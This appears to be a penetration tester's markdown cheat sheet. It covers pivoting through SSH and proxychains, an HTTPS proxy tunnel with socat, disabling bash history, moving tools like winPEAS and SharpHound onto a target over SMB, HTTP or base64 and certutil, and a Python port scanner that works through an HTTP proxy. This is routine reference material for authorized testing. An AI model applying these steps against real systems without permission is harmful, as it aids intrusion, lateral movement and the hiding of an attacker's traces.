## Find the meaning of unknown error codes with certutil:
`certutil -error <error_id>`

## Access HTTPS proxy with proxychains:
Proxychains supports SOCKS4, SOCKS5 and HTTP but not HTTPS.  
Using socat to create an HTTPS tunnel between a local port and a remote proxy:  
`socat TCP-LISTEN:19999,bind=127.0.0.1,fork,reuseaddr OPENSSL:proxy.yolo.com:8000,verify=0`  
(verify=0 to bypass certificate errors, for example self-signed client certificate)  

Then in `/etc/proxychains.conf` :
`http 127.0.0.1 19999`

From <https://github.com/rofl0r/proxychains-ng/issues/337>  
  
## SSH Pivoting/Tunneling 
- Use `sshuttle` : https://github.com/sshuttle/sshuttle  
- Use `ssh` + `proxychains` :  
  `ssh -D 9999 john@10.10.110.50`
  Then `proxychains <command>`   
  (with the config `socks4 127.0.0.1 9999` in the `proxychains4.conf` file)  


 ## Easily mount a shared folder between host & VM in virtualbox: 
 `mkdir Shared_VMs`  
 `sudo mount -t vboxsf Shared_VMs Shared_VMs`  
           
 ## Leave a command running when the SSH session is disconnected with `nohup`:  
`nohup nmap -Pn -A -p- -oA results_nmap 192.168.210.10-20 &exit`   
   
## Temporarily turn off bash history:  
`unset HISTFILE`  
`set +o history`   
  
## File transfer techniques: 
### Using SMB:  
`impacket-smbserver share .`  
Then `//10.10.14.108/share/winPEASx64.exe searchall cmd`    
  
### Using python:  
`python2 -m SimpleHTTPServer <PORT>`  
`python3 -m http.server <PORT>`  
  
### Using a compiled binary for Windows:  
`pip install pyinstaller`  
`pyinstaller web.py --onefile`  
  
`web.exe <PORT>`  
  
### Using base64 encoding:  
Attacker-side (Linux). Newlines can be trimmed on Linux using `sed` or `tr`.     
`base64 -w 0 <FILE> | xclip -selection clipboard`  
or `cat SharpHound.exe | base64 | tr -d '\n' > b64Sharphound.txt`  
    
Attacker-side (Windows). Newlines can be trimmed on Linux using `sed` or `tr`.  
`certutil -encode <FILE> tmp_file_base64.txt`  
`sed ':a;N;$!ba;s/\n//g' <FILE>`  
  
Target-side - Linux  
`echo '<BASE64_FILECONTENT>' | base64 --decode > <OUTPUT_FILE>`  
  
Target-side - Windows  
`echo <BASE64_FILECONTENT> > tmp_file_base64.txt`  
`certutil -decode tmp_file_base64.txt <OUTPUT_FILE>`  
`del tmp_file_base64.txt`  
*(Several techniques are from <https://notes.qazeer.io/general/file_transfer>)*    

## Fix network errors on Windows  
Flush the DNS cache : `ipconfig /flushdns`   
Reset the Winsock program (Windows API used to interact with the TCP/IP stack) : `netsh winsock reset`   

  
## Portscan behind a HTTP proxy (by @iansus):     
```
#!/usr/bin/python3
 
import socket
 
PROXY = 'proxy.client'
PROXYPORT = 8080
 
def portscan(domain, port):
 
    s = socket.socket()
    s.connect((PROXY, PROXYPORT))
    
    payload1 = 'CONNECT %(host)s:%(port)d\r\nHost: %(host)s:%(port)d\r\n\r\n' % {'host':domain, 'port':port}
    s.send(bytes(payload1, 'utf-8'))
    data = s.recv(1024)
    assert(b'HTTP/1.1 200' in data)
    
    s.settimeout(0.5)
    payload2 = 'GET / HTTP/1.1\r\nHost: %(host)s:%(port)d\r\n\r\n' % {'host':domain, 'port':port}
    
    s.send(bytes(payload2, 'utf-8'))
    s.recv(1024)
    
 
domain = 'appli.client.fr'
portstr = '7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157'
 
ports = []
for portdef in portstr.split(','):
    if not '-' in portdef:
        ports.append(int(portdef))
        
    else:
        start, end = map(int, portdef.split('-'))
        ports += range(start, end+1)
 
 
for port in ports:
    try:
        portscan(domain, port)
        print('Port %d is open on %s' % (port, domain))
        
    except Exception as e:
        print('Port %d is closed on %s (%s)' % (port, domain, str(e)))
        
```
